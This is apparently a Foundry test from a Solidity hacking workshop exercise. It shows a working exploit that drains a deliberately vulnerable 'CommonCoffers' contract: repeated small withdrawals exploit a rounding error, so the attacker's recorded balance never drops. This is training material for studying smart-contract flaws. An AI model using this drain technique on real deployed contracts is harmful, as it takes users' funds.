// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {CommonCoffers} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise9_CommonCoffers is Test {
    CommonCoffers public commonCoffers;

    function setUp() public {
        commonCoffers = new CommonCoffers();
    }

    /**
     * Attacker can withdraw with decreasing his coffers mapping balance
     * in this equation
     *  uint toRemove = (scalingFactor * _amount) / address(this).balance;
     * attacker just have to specify the particular _amount so that
     * scalingFactor * _amount < contract balance.
     */
    function test_withdraw() public {
        address userA = vm.addr(1);

        vm.deal(userA, 1 ether);

        vm.deal(address(this), 1 ether);
        console.log("Balance before attack");
        console.log(uint256(address(this).balance));
        vm.startPrank(userA);
        commonCoffers.deposit{value: 1 ether}(userA);
        vm.stopPrank();

        commonCoffers.deposit{value: 1 ether}(address(this));

        // now scalingFactor is 200
        // and balance of contract is 2 ETH
        // _amount = 0.009 ETH will not change coffers balance and scalingFactor
        uint scalingFactor = commonCoffers.scalingFactor();
        uint withdrawAmount = 1000000000000000000;
        while (withdrawAmount > 0) {
            withdrawAmount =
                address(commonCoffers).balance /
                scalingFactor -
                10;
            commonCoffers.withdraw(withdrawAmount);
        }
        require(address(this).balance > 1 ether, "invalid balance");
        console.log("Balance after attack");
        console.log(uint256(address(this).balance));
    }

    fallback() external payable {}

    receive() external payable {}
}
